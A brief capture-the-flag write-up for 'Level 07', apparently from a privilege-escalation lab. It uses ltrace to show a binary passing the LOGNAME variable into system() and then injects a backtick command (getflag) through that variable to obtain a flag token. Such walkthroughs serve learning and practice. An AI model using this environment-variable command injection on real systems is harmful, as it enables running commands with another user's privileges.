# Level 07

A single binary can be found in user directory, it has flag07 permissions.

```bash
ltrace ./level07
getenv("LOGNAME")                                                         = "level07"
asprintf(0xbffff724, 0x8048688, 0xbfffff40, 0xb7e5ee55, 0xb7fed280)       = 18
system("/bin/echo level07 "level07
```

As we change `LOGNAME`, the output changes accordingly.

```bash
export LOGNAME=\`getflag\`
./level07 # Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

